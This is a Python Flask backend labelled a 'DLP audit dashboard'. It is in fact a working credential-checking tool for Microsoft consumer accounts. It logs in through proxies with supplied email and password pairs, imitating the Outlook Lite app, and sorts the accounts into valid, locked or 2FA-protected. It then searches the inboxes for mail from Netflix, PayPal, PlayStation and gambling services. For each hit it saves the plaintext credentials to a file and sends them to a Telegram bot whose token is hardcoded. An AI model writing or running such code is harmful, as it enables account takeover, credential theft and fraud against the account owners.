#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════
  DLP AUDIT DASHBOARD — Backend Flask + SSE
  Basado en test_flow_dlp.py (referencia funcional)
═══════════════════════════════════════════════════════
"""
from flask import Flask, request, Response, jsonify, send_from_directory, session
import requests as http_requests
import re
import json
import time
import random
import threading
import queue
import urllib3
import sqlite3
from werkzeug.security import generate_password_hash, check_password_hash
import os
import traceback

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__, static_folder='.', template_folder='.')
app.secret_key = os.environ.get('SECRET_KEY') or os.urandom(24)

@app.errorhandler(Exception)
def handle_exception(e):
    return jsonify({"error": "Crash Crítico", "trace": traceback.format_exc()}), 500

audit_queues = {}
stop_flags = {} # Track stop signal for manual audits

DB_NAME = "database.db"
DATABASE_URL = os.environ.get("DATABASE_URL", "").strip()

def get_db_conn():
    """Returns a DB connection: PostgreSQL if DATABASE_URL is set and reachable, else SQLite."""
    global DATABASE_URL
    if DATABASE_URL:
        try:
            import psycopg2
            return psycopg2.connect(DATABASE_URL, connect_timeout=15)
        except Exception as e:
            print(f"⚠️ Alerta PostgreSQL: No se pudo conectar a DATABASE_URL. Cayendo a SQLite local. Error: {e}", flush=True)
            DATABASE_URL = ""  # Force fallback for subsequent calls in this thread
            
    return sqlite3.connect(DB_NAME)

def q(sql):
    """Adapt SQLite ? placeholders to PostgreSQL %s when needed."""
    if DATABASE_URL:
        return sql.replace("?", "%s")
    return sql

def init_db():
    try:
        conn = get_db_conn()
        c = conn.cursor()
        if DATABASE_URL:
            c.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    id SERIAL PRIMARY KEY,
                    username TEXT UNIQUE NOT NULL,
                    password_hash TEXT NOT NULL,
                    telegram_chat_id TEXT,
                    saved_senders TEXT,
                    allow_247 INTEGER DEFAULT 0
                )
            ''')
            c.execute('''
                CREATE TABLE IF NOT EXISTS scan_requests (
                    id SERIAL PRIMARY KEY,
                    username TEXT NOT NULL,
                    status TEXT DEFAULT 'pending',
                    last_msg_id BIGINT,
                    files_scanned INTEGER DEFAULT 0,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
        else:
            c.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT UNIQUE NOT NULL,
                    password_hash TEXT NOT NULL,
                    telegram_chat_id TEXT,
                    saved_senders TEXT,
                    allow_247 INTEGER DEFAULT 0
                )
            ''')
            c.execute('''
                CREATE TABLE IF NOT EXISTS scan_requests (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT NOT NULL,
                    status TEXT DEFAULT 'pending',
                    last_msg_id INTEGER,
                    files_scanned INTEGER DEFAULT 0,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
        if DATABASE_URL:
            # PostgreSQL already has the columns in the CREATE statements, so skip ALTER
            conn.commit()
            conn.close()
            return
            
        # Ejecutar migraciones ALTER TABLE para SQLite local antiguo
        for col, dtype in [('telegram_chat_id', 'TEXT'), ('saved_senders', 'TEXT'), ('allow_247', 'INTEGER DEFAULT 0')]:
            try: c.execute(f'ALTER TABLE users ADD COLUMN {col} {dtype}')
            except Exception: pass
            
        for col, dtype in [('last_msg_id', 'BIGINT'), ('files_scanned', 'INTEGER DEFAULT 0')]:
            try: c.execute(f'ALTER TABLE scan_requests ADD COLUMN {col} {dtype}')
            except Exception: pass
            
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"❌ CRÍTICO: Fallo al inicializar la base de datos: {e}", flush=True)

init_db()


def load_proxies_from_text(text):
    proxies = []
    for line in text.strip().split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if not line.startswith(('http://', 'https://', 'socks')):
            parts = line.split(':')
            if len(parts) == 4:
                ip, port, user, pwd = parts
                line = f"http://{user}:{pwd}@{ip}:{port}"
            elif len(parts) == 2:
                line = f"http://{line}"
            else:
                continue
        proxies.append({"http": line, "https": line})
    return proxies


def emit_event(q, event_type, data):
    if hasattr(q, 'put'):
        q.put(json.dumps({"type": event_type, **data}))
    else:
        # Fallback for headless execution (e.g. from telegram_listener)
        print(f"[EVENT] {event_type} | {data}")


def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_chat_id="", multi_user=False, hit_buffer=None, target_user_filter=None, session_id=None):
    """
    Flujo 7 pasos (basado en test_flow_dlp.py):
    """
    # Check for stop flag
    if session_id and stop_flags.get(session_id):
        emit_event(q, "warning", {"message": "Proceso detenido por el usuario."})
        return

    classification = "ERROR"
    session = http_requests.Session()

    if proxy_dict:
        session.proxies.update(proxy_dict)
        proxy_display = proxy_dict['http'].split('@')[-1] if '@' in proxy_dict['http'] else proxy_dict['http']
    else:
        proxy_display = "Directa"
    emit_event(q, "info", {"message": f"Proxy: {proxy_display}"})

    # ─── User-Agent mobile (CLAVE para que microsoftonline devuelva PPFT) ───
    mobile_ua = (
        "Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
        "Chrome/91.0.4472.114 Mobile Safari/537.36"
    )

    session.headers.update({
        "User-Agent": mobile_ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "upgrade-insecure-requests": "1",
        "x-requested-with": "com.microsoft.outlooklite",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
    })

    # ══════════════════════════════════════════════════
    # PASO 1 — Auth page (microsoftonline + UA android)
    # ══════════════════════════════════════════════════
    emit_event(q, "step_start", {"step": 1, "name": "Página de Login"})

    auth_url = (
        "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
        "client_info=1&haschrome=1"
        f"&login_hint={email}"
        "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
        "&mkt=en&response_type=code"
        "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
    )

    try:
        session.headers.pop("Host", None)
        res1 = session.get(auth_url, verify=False, timeout=20, allow_redirects=True)
        if res1.status_code == 200 and len(res1.text) > 100:
            emit_event(q, "step_pass", {"step": 1, "detail": f"OK | {len(res1.text)} bytes"})
        else:
            emit_event(q, "step_fail", {"step": 1, "detail": f"HTTP {res1.status_code}"})
            emit_event(q, "done", {"classification": "ERROR", "email": email})
            return
    except Exception as e:
        emit_event(q, "step_fail", {"step": 1, "detail": str(e)[:100]})
        emit_event(q, "done", {"classification": "ERROR", "email": email})
        return

    # ══════════════════════════════════════════════════
    # PASO 2 — Extraer PPFT + urlPost
    # ══════════════════════════════════════════════════
    emit_event(q, "step_start", {"step": 2, "name": "Tokens PPFT"})
    time.sleep(0.2)

    ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', res1.text)
    if not ppft_match:
        ppft_match = re.search(r'name=\\"PPFT\\"[^>]*value=\\"([^\\]+)\\"', res1.text)
    if not ppft_match:
        ppft_match = re.search(r'"sFT"\s*:\s*"([^"]+)"', res1.text)
    if not ppft_match:
        ppft_match = re.search(r'PPFT[^v]*value=(?:\\"|")(.*?)(?:\\"|")', res1.text)

    pl_match = re.search(r'urlPost\s*["\']?\s*:\s*["\']([^"\']+)["\']', res1.text)
    if not pl_match:
        pl_match = re.search(r'urlPost\s*:\s*"([^"]+)"', res1.text)

    if re.search(r'captcha|hip-frame|HipChallengeUrl|arkose', res1.text, re.IGNORECASE):
        emit_event(q, "warning", {"message": "CAPTCHA detectado — proxy puede ayudar"})

    # Fallback: buscar URL de post.srf directamente
    if not pl_match:
        post_urls = re.findall(r'https://login\.live\.com/ppsecure/post\.srf[^"\'\\ ]*', res1.text)
        if post_urls:
            class _FM:
                def group(self, n): return post_urls[0]
            pl_match = _FM()

    if not ppft_match or not pl_match:
        emit_event(q, "step_fail", {"step": 2, "detail": "PPFT/urlPost no encontrado"})
        emit_event(q, "done", {"classification": "ERROR", "email": email})
        return

    ppft = ppft_match.group(1)
    post_url = pl_match.group(1)
    emit_event(q, "step_pass", {"step": 2, "detail": f"PPFT OK ({len(ppft)} chars)"})

    # ══════════════════════════════════════════════════
    # PASO 3 — Enviar credenciales
    # ══════════════════════════════════════════════════
    emit_event(q, "step_start", {"step": 3, "name": "Login"})
    time.sleep(0.3)

    post_data = {
        "i13": "1", "login": email, "loginfmt": email, "type": "11",
        "LoginOptions": "1", "lrt": "", "lrtPartition": "",
        "hisRegion": "", "hisScaleUnit": "", "passwd": password,
        "ps": "2", "psRNGCDefaultType": "", "psRNGCEntropy": "", "psRNGCSLK": "",
        "canary": "", "ctx": "", "hpgrequestid": "",
        "PPFT": ppft, "PPSX": "Passport", "NewUser": "1", "FoundMSAs": "",
        "fspost": "0", "i21": "0", "CookieDisclosure": "0",
        "IsFidoSupported": "0", "isSignupPost": "0",
        "isRecoveryAttemptPost": "0", "i19": "3772"
    }

    session.headers.pop("Host", None)
    session.headers.update({
        "Origin": "https://login.live.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": res1.url,
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": mobile_ua + " PKeyAuth/1.0",
    })

    try:
        res2 = session.post(post_url, data=post_data, allow_redirects=False, verify=False, timeout=20)
        location = res2.headers.get("Location", "")
        response_text = res2.text
    except Exception as e:
        emit_event(q, "step_fail", {"step": 3, "detail": str(e)[:100]})
        emit_event(q, "done", {"classification": "ERROR", "email": email})
        return

    if "account or password is incorrect" in response_text:
        emit_event(q, "step_fail", {"step": 3, "detail": "Contraseña incorrecta"})
        emit_event(q, "done", {"classification": "BAD PASS", "email": email})
        return
    if "AADSTS50034" in response_text:
        emit_event(q, "step_fail", {"step": 3, "detail": "Cuenta no existe"})
        emit_event(q, "done", {"classification": "NOT EXIST", "email": email})
        return
    if "AADSTS50053" in response_text:
        emit_event(q, "step_fail", {"step": 3, "detail": "Cuenta bloqueada"})
        emit_event(q, "done", {"classification": "BLOCKED", "email": email})
        return
    if "AADSTS50057" in response_text:
        emit_event(q, "step_fail", {"step": 3, "detail": "Cuenta deshabilitada"})
        emit_event(q, "done", {"classification": "DISABLED", "email": email})
        return
    if "identity/confirm" in response_text or "recover" in response_text:
        emit_event(q, "step_pass", {"step": 3, "detail": "Login válido — 2FA activo"})
        emit_event(q, "step_2fa", {"step": 4, "detail": "2FA — sin acceso al inbox"})
        emit_event(q, "done", {"classification": "2FA NO ACC", "email": email})
        return
    if "Abuse" in response_text or "finisherror.srf" in response_text:
        emit_event(q, "step_fail", {"step": 3, "detail": "Bloqueada por abuso"})
        emit_event(q, "done", {"classification": "BLOCKED", "email": email})
        return
    if "too many times" in response_text:
        emit_event(q, "step_fail", {"step": 3, "detail": "Rate limit"})
        emit_event(q, "done", {"classification": "RATE LIMIT", "email": email})
        return
    if res2.status_code == 200:
        err_match = re.search(r'"sErrTxt"\s*:\s*"([^"]+)"', response_text)
        if err_match and err_match.group(1):
            emit_event(q, "step_fail", {"step": 3, "detail": err_match.group(1)[:80]})
            emit_event(q, "done", {"classification": "BAD PASS", "email": email})
            return

    emit_event(q, "step_pass", {"step": 3, "detail": f"Login OK (HTTP {res2.status_code})"})
    classification = "LOGIN OK"


    # ══════════════════════════════════════════════════
    # PASO 4 — Auth Code
    # ══════════════════════════════════════════════════
    emit_event(q, "step_start", {"step": 4, "name": "Auth Code"})

    if not location:
        code_in_body = re.search(r'code=([^&"\']+)', response_text)
        if code_in_body:
            location = f"?code={code_in_body.group(1)}"
        else:
            emit_event(q, "step_fail", {"step": 4, "detail": "Auth code no encontrado"})
            emit_event(q, "done", {"classification": classification, "email": email})
            return

    code_match = re.search(r'code=([^&]+)', location)
    if not code_match:
        emit_event(q, "step_fail", {"step": 4, "detail": "Auth code no encontrado en Location"})
        emit_event(q, "done", {"classification": classification, "email": email})
        return

    auth_code = code_match.group(1)
    emit_event(q, "step_pass", {"step": 4, "detail": f"Code: {auth_code[:20]}... ({len(auth_code)} chars)"})

    # ══════════════════════════════════════════════════
    # PASO 5 — Access Token
    # ══════════════════════════════════════════════════
    emit_event(q, "step_start", {"step": 5, "name": "Access Token"})
    time.sleep(0.3)

    # CRÍTICO: Eliminar 'Origin' y 'Referer' de la sesión.
    # Si Microsoft ve 'Origin', asume que es una petición CORS de navegador (SPA),
    # y bloquea el client_id nativo (e9b154d0...) con error AADSTS90023 SPA.
    session.headers.pop("Origin", None)
    session.headers.pop("Referer", None)
    session.headers.pop("Sec-Fetch-Site", None)

    token_data = {
        "client_info": "1",
        "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
        "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
        "grant_type": "authorization_code",
        "code": auth_code,
        "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
    }

    token_headers = {
        "User-Agent": "Mozilla/5.0 (compatible; MSAL 1.0)",
        "x-client-Ver": "1.0.0+635e350c",
        "x-client-OS": "28",
        "x-client-SKU": "MSAL.xplat.android",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Host": "login.microsoftonline.com",
    }

    try:
        res3 = session.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=token_data, headers=token_headers, verify=False, timeout=20
        )

        if res3.status_code == 200:
            tok = res3.json()
            access_token = tok.get("access_token")
            if access_token:
                emit_event(q, "step_pass", {"step": 5, "detail": f"Token OK ({len(access_token)} chars) | exp: {tok.get('expires_in','?')}s"})
            else:
                emit_event(q, "step_fail", {"step": 5, "detail": "Sin access_token en respuesta"})
                emit_event(q, "done", {"classification": classification, "email": email})
                return
        else:
            try:
                err = res3.json()
                emit_event(q, "step_fail", {"step": 5, "detail": f"{err.get('error','?')}: {err.get('error_description','')[:80]}"})
            except:
                emit_event(q, "step_fail", {"step": 5, "detail": f"HTTP {res3.status_code}"})
            emit_event(q, "done", {"classification": classification, "email": email})
            return
    except Exception as e:
        emit_event(q, "step_fail", {"step": 5, "detail": str(e)[:100]})
        emit_event(q, "done", {"classification": classification, "email": email})
        return

    # ══════════════════════════════════════════════════
    # PASO 6 — Perfil (substrate.office.com)
    # ══════════════════════════════════════════════════
    emit_event(q, "step_start", {"step": 6, "name": "Perfil"})

    cid = session.cookies.get("MSPCID", "").upper()
    api_headers = {
        "User-Agent": "Outlook-Android/2.0",
        "Accept": "application/json",
        "Authorization": f"Bearer {access_token}",
        "X-AnchorMailbox": f"CID:{cid}",
        "Content-Type": "application/json"
    }

    name, country = "N/A", "N/A"
    try:
        res_prof = session.get(
            "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
            headers=api_headers, verify=False, timeout=15
        )
        if res_prof.status_code == 200:
            prof = res_prof.json()
            name = prof.get("displayName", "N/A")
            
            # Attempt 1: Direct location attribute
            country = prof.get("location", "N/A")
            
            # Attempt 2: Parse from region or culture
            if country == "N/A" or not country:
                country = prof.get("region", prof.get("Culture", "N/A"))
                
            # Fallback 3: TLD Extraction (e.g. .mx, .es, .cl)
            if country == "N/A" or not country:
                domain = email.split('@')[-1].lower()
                if '.' in domain:
                    tld = domain.split('.')[-1]
                    if len(tld) == 2:  # Country codes are 2 letters
                        country = tld.upper()
                
            emit_event(q, "step_pass", {"step": 6, "detail": f"{name} | {country}"})
        else:
            emit_event(q, "step_pass", {"step": 6, "detail": f"Email: {email}"})
    except:
        emit_event(q, "step_pass", {"step": 6, "detail": f"Email: {email}"})

    emit_event(q, "profile", {"name": name, "country": country})

    # ══════════════════════════════════════════════════
    # PASO 7 — Búsqueda DLP (Bearer token, no cookies)
    # ══════════════════════════════════════════════════
    # List of searches to execute
    searches_to_run = []
    
    if multi_user:
        # Fetch all users with saved senders and Telegram chat IDs
        try:
            conn = get_db_conn()
            c = conn.cursor()
            if target_user_filter:
                sql = ("SELECT username, telegram_chat_id, saved_senders FROM users "
                       "WHERE username = ? AND saved_senders IS NOT NULL AND saved_senders != '' "
                       "AND telegram_chat_id IS NOT NULL AND telegram_chat_id != ''")
                c.execute(q(sql), (target_user_filter,))
            else:
                sql = ("SELECT username, telegram_chat_id, saved_senders FROM users "
                       "WHERE saved_senders IS NOT NULL AND saved_senders != '' "
                       "AND telegram_chat_id IS NOT NULL AND telegram_chat_id != ''")
                c.execute(sql)
            db_users = c.fetchall()
            
            for d_uname, d_chat_id, d_senders in db_users:
                senders_list = [s.strip() for s in d_senders.split(',') if s.strip()]
                if not senders_list: continue
                
                # OPTIMIZATION: Combine senders in batches of 10
                chunk_size = 10
                for i in range(0, len(senders_list), chunk_size):
                    chunk = senders_list[i:i+chunk_size]
                    or_query = " OR ".join([f"from:{s}" for s in chunk])
                    final_q = f'({or_query}) "{keyword}"' if keyword else f'({or_query})'
                    
                    searches_to_run.append({
                        "username": d_uname,
                        "chat_id": d_chat_id,
                        "query": final_q,
                        "label": chunk[0] if len(chunk) == 1 else "BATCH",
                        "is_multi": True,
                        "chunk": chunk
                    })
        except Exception as e:
            emit_event(q, "warning", {"message": f"Error fetching db users: {e}"})
        finally:
            try: conn.close()
            except: pass
    else:
        # Standard Single-User Search
        if sender:
            senders_list = [s.strip() for s in sender.split(',') if s.strip()]
            if senders_list:
                # OPTIMIZATION: Combine senders in batches of 10
                chunk_size = 10
                for i in range(0, len(senders_list), chunk_size):
                    chunk = senders_list[i:i+chunk_size]
                    or_query = " OR ".join([f"from:{s}" for s in chunk])
                    final_q = f'({or_query}) "{keyword}"' if keyword else f'({or_query})'
                    
                    searches_to_run.append({
                        "username": "Local Dashboard",
                        "chat_id": tg_chat_id,
                        "query": final_q,
                        "label": chunk[0] if len(chunk) == 1 else "BATCH",
                        "is_multi": False,
                        "chunk": chunk
                    })
        else:
            searches_to_run.append({
                "username": "Local Dashboard",
                "chat_id": tg_chat_id,
                "query": keyword,
                "label": keyword,
                "is_multi": False,
                "chunk": []
            })
        
    global_classification = "CLEAN"

    def run_outlook_search(query_string, username, is_silent=False):
        if not is_silent:
            emit_event(q, "step_start", {"step": 7, "name": f"Búsqueda: {query_string[:30]} ({username})"})
            emit_event(q, "info", {"message": f'Query [{username}]: "{query_string}"'})
        time.sleep(0.2)
        
        search_payload = {
            "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "Egypt Standard Time",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Filter": {
                    "Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                    ]
                },
                "From": 0,
                "Query": {"QueryString": query_string},
                "RefiningQueries": None,
                "Size": 25,
                "Sort": [
                    {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                    {"Field": "Time", "SortDirection": "Desc"}
                ],
                "EnableTopResults": True,
                "TopResultsCount": 3
            }],
            "AnswerEntityRequests": [{
                "Query": {"QueryString": query_string},
                "EntityTypes": ["Event", "File"],
                "From": 0,
                "Size": 100,
                "EnableAsyncResolution": True
            }],
            "QueryAlterationOptions": {
                "EnableSuggestion": True,
                "EnableAlteration": True,
                "SupportedRecourseDisplayTypes": [
                    "Suggestion",
                    "NoResultModification",
                    "NoResultFolderRefinerModification",
                    "NoRequeryModification",
                    "Modification"
                ]
            },
            "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
        }

        t_found = 0
        s_ok = False

        try:
            res_search = session.post(
                "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124",
                json=search_payload, headers=api_headers,
                verify=False, timeout=20
            )

            if not is_silent:
                emit_event(q, "info", {"message": f"Search HTTP: {res_search.status_code}"})

            if res_search.status_code == 200:
                data = res_search.json()
                for er in data.get("EntityResponses", []):
                    if er.get("EntityType") == "Conversation":
                        t_found = er.get("Total", 0)
                        break
                        
                if t_found == 0:
                    def find_total(obj):
                        if isinstance(obj, dict):
                            if "Total" in obj and isinstance(obj["Total"], int):
                                return obj["Total"]
                            for v in obj.values():
                                res = find_total(v)
                                if res is not None:
                                    return res
                        elif isinstance(obj, list):
                            for item in obj:
                                res = find_total(item)
                                if res is not None:
                                    return res
                        return None

                    found = find_total(data)
                    if found is not None:
                        t_found = found
                    else:
                        for es in data.get("EntitySets", []):
                            for rs in es.get("ResultSets", []):
                                results_list = rs.get("Results", [])
                                t_found += len(results_list)
                s_ok = True
            elif res_search.status_code == 401:
                emit_event(q, "warning", {"message": f"401 — token sin permiso [{username}]"})
            else:
                emit_event(q, "warning", {"message": f"Search HTTP {res_search.status_code} [{username}]"})
        except Exception as e:
            emit_event(q, "warning", {"message": f"Search error [{username}]: {str(e)[:80]}"})
            
        return t_found, s_ok

    def process_hit(chat_id, uname, s_label, s_query, t_found):
        nonlocal global_classification
        global_classification = "HIT"
        emit_event(q, "step_pass", {"step": 7, "detail": f"{t_found} msgs — {s_label} ({uname})"})
        emit_event(q, "dlp_result", {"total": t_found, "keyword": s_query, "sender": s_label})
        emit_event(q, "warning", {"message": f"🚨 {t_found} msgs encontrados: {s_query}"})
        
        try:
            gate_filename = "hits_encontrados.txt"
            with open(gate_filename, "a", encoding="utf-8") as gf:
                gf.write("="*40 + "\
")
                gf.write(f"🎯 ALERTA MULTI-USER: Destinado para {uname}\
")
                gf.write(f"🎯 OBJETIVO: {s_query}\
")
                gf.write(f"📧 Correo: {email}\
")
                gf.write(f"🔑 Pass: {password}\
")
                gf.write(f"🌍 País: {country} | Nombre: {name}\
")
                gf.write(f"📊 Total Encontrados: {t_found}\
")
                gf.write("="*40 + "\
\
")
            emit_event(q, "info", {"message": f"💾 Gate guardado en {gate_filename}"})
        except Exception as e:
            emit_event(q, "warning", {"message": f"Error guardando gate: {e}"})

        TELEGRAM_BOT_TOKEN = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
        if TELEGRAM_BOT_TOKEN and chat_id:
            friendly_names = {
                "info@account.netflix.com": "NETFLIX 🎬",
                "no_reply@vip.codere.com": "CODERE 🎰",
                "no-reply@mailer.caliente.mx": "CALIENTE 🔥",
                "noreply@zilch.com": "ZILCH 💳",
                "service@intl.paypal.com": "PAYPAL 💰",
                "reply@txn-email.playstation.com": "PLAYSTATION 🎮"
            }
            display_match = friendly_names.get(s_label.lower(), s_label)
            
            if hit_buffer is not None:
                hit_buffer.append({
                    "user": uname,
                    "match": display_match,
                    "email": email,
                    "pass": password,
                    "country": country,
                    "name": name,
                    "total": t_found,
                    "query": s_query,
                    "chat_id": chat_id
                })
                emit_event(q, "info", {"message": f"📦 HIT recolectado para reporte individual ({display_match})"})
            else:
                try:
                    tg_msg = (f"📣 *¡OBJETIVO DETECTADO! (HIT)* 🎯\
━━━━━━━━━━━━━━━━━━\
\
"
                              f"👤 *Usuario:* `{uname}`\
✅ *Match:* `{display_match}`\
\
"
                              f"📧 *Correo:* `{email}`\
🔑 *Pass:* `{password}`\
"
                              f"🌍 *País:* {country}\
👤 *Nombre:* {name}\
"
                              f"📊 *Mensajes:* `{t_found}`\
🔍 *Búsqueda:* `{s_query}`\
"
                              f"🤖 *DLP Audit Pro System*")
                    tg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                    res = http_requests.post(tg_url, json={"chat_id": chat_id, "text": tg_msg, "parse_mode": "Markdown"}, timeout=5)
                    res.raise_for_status()
                    emit_event(q, "info", {"message": f"✅ Alerta enviada a Telegram de {uname}"})
                except Exception as e:
                    err_txt = getattr(e, 'response', None)
                    err_msg = err_txt.text if err_txt else str(e)
                    emit_event(q, "warning", {"message": f"⚠️ Error enviando a Telegram: {err_msg[:100]}"})

    for search_task in searches_to_run:
        target_username = search_task["username"]
        target_chat_id = search_task["chat_id"]
        search_q = search_task["query"]
        chunk = search_task.get("chunk", [])
        
        t_batch, s_ok = run_outlook_search(search_q, target_username, is_silent=False)
        
        if t_batch > 0:
            if chunk and len(chunk) > 1:
                emit_event(q, "info", {"message": f"🔍 {t_batch} detectados en grupo. Analizando individualmente para conteo exacto..."})
                for s in chunk:
                    indiv_q = f'from:{s} "{keyword}"' if keyword else f'from:{s}'
                    i_total, i_ok = run_outlook_search(indiv_q, target_username, is_silent=True)
                    if i_total > 0:
                        process_hit(target_chat_id, target_username, s, indiv_q, i_total)
            else:
                t_label = chunk[0] if chunk else search_task["label"]
                process_hit(target_chat_id, target_username, t_label, search_q, t_batch)
        else:
            emit_event(q, "info", {"message": f"✅ 0 mensajes — inbox limpio ({target_username})"})

    emit_event(q, "done", {"classification": global_classification, "email": email})


# ══════════════════════════════════════════════════
# AUTH ENDPOINTS
# ══════════════════════════════════════════════════
@app.route('/api/get-settings', methods=['GET'])
def get_settings():
    if 'username' not in session:
        return jsonify({"error": "No autenticado"}), 401
    
    conn = get_db_conn()
    c = conn.cursor()
    c.execute(q("SELECT allow_247 FROM users WHERE username = ?"), (session['username'],))
    row = c.fetchone()
    conn.close()
    
    if row:
        return jsonify({"allow_247": bool(row[0])})
    return jsonify({"allow_247": False})

@app.route('/api/update-settings', methods=['POST'])
def update_settings():
    if 'username' not in session:
        return jsonify({"error": "No autenticado"}), 401
    
    data = request.json
    allow = 1 if data.get('allow_247') else 0
    
    conn = get_db_conn()
    c = conn.cursor()
    c.execute(q("UPDATE users SET allow_247 = ? WHERE username = ?"), (allow, session['username']))
    conn.commit()
    conn.close()
    
    return jsonify({"message": "Configuración guardada", "allow_247": bool(allow)})

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()
    chat_id = data.get('chat_id', '').strip()

    if not username or not password:
        return jsonify({"error": "Usuario y contraseña son requeridos"}), 400

    conn = get_db_conn()
    c = conn.cursor()
    c.execute(q('SELECT id FROM users WHERE username=?'), (username,))
    if c.fetchone():
        conn.close()
        return jsonify({"error": "El usuario ya existe, intenta con otro nombre"}), 400

    hashed_pw = generate_password_hash(password, method='pbkdf2:sha256')
    try:
        c.execute(q('INSERT INTO users (username, password_hash, telegram_chat_id) VALUES (?, ?, ?)'),
                  (username, hashed_pw, chat_id))
        conn.commit()
        conn.close()
    except Exception as e:
        conn.close()
        if "unique" in str(e).lower() or "UNIQUE" in str(e):
            return jsonify({"error": "El usuario ya existe, intenta con otro nombre"}), 400
        return jsonify({"error": f"Error de base de datos: {str(e)[:80]}"}), 500
    
    return jsonify({"success": "Usuario registrado exitosamente"})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()

    conn = get_db_conn()
    c = conn.cursor()
    c.execute(q('SELECT id, password_hash, telegram_chat_id FROM users WHERE username=?'), (username,))
    row = c.fetchone()
    conn.close()

    if not row or not check_password_hash(row[1], password):
        return jsonify({"error": "Credenciales inválidas"}), 401

    session['user_id'] = row[0]
    session['username'] = username
    # Don't send back chat_id in plain text permanently, just in session
    return jsonify({"success": "Sesión iniciada", "username": username, "chat_id": row[2] or ""})

@app.route('/api/logout', methods=['POST'])
def logout():
    session.clear()
    return jsonify({"success": "Sesión cerrada"})

@app.route('/api/me', methods=['GET'])
def me():
    if 'user_id' not in session:
        return jsonify({"error": "No autorizado", "chat_id": "", "saved_senders": ""}), 401
    
    conn = get_db_conn()
    c = conn.cursor()
    c.execute(q('SELECT telegram_chat_id, saved_senders FROM users WHERE id=?'), (session['user_id'],))
    row = c.fetchone()
    conn.close()

    return jsonify({"username": session['username'], "chat_id": row[0] or "", "saved_senders": row[1] or ""})

@app.route('/api/debug-db')
def debug_db():
    try:
        conn = get_db_conn()
        c = conn.cursor()
        c.execute("SELECT username, telegram_chat_id, saved_senders FROM users")
        data = c.fetchall()
        conn.close()
        return jsonify({"data": data, "status": "ok"})
    except Exception as e:
        import traceback
        return jsonify({"error": str(e), "trace": traceback.format_exc()})

@app.route('/api/test-db')
def test_db():
    log = []
    try:
        log.append("Attempting import psycopg2")
        import psycopg2
        log.append("Imported psycopg2 successfully")
        
        url = os.environ.get("DATABASE_URL")
        log.append(f"DB URL Set: {bool(url)}")
        
        conn = psycopg2.connect(url, connect_timeout=5)
        log.append("Connected to DB successfully")
        
        c = conn.cursor()
        c.execute("SELECT current_database();")
        db_name = c.fetchone()[0]
        log.append(f"DB Name queried: {db_name}")
        
        c.execute("SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname = 'public';")
        tables = [r[0] for r in c.fetchall()]
        log.append(f"Tables found: {tables}")
        
        conn.close()
        return jsonify({"success": True, "log": log})
    except Exception as e:
        import traceback
        return jsonify({"success": False, "log": log, "error": str(e), "trace": traceback.format_exc()})

@app.route('/api/force-init')
def force_init():
    try:
        init_db()
        return jsonify({"success": True, "msg": "Database forcefully initialized"})
    except Exception as e:
        import traceback
        return jsonify({"success": False, "error": str(e), "trace": traceback.format_exc()})

@app.route('/api/update_gate', methods=['POST'])
def update_gate():
    if 'user_id' not in session:
        return jsonify({"error": "No autorizado"}), 401
        
    data = request.json
    chat_id = data.get('chat_id', '').strip()
    
    conn = get_db_conn()
    c = conn.cursor()
    c.execute(q('UPDATE users SET telegram_chat_id=? WHERE id=?'), (chat_id, session['user_id']))
    conn.commit()
    conn.close()
    
    return jsonify({"success": "Gate actualizado", "chat_id": chat_id})

@app.route('/api/update_senders', methods=['POST'])
def update_senders():
    if 'user_id' not in session:
        return jsonify({"error": "No autorizado"}), 401
        
    data = request.json
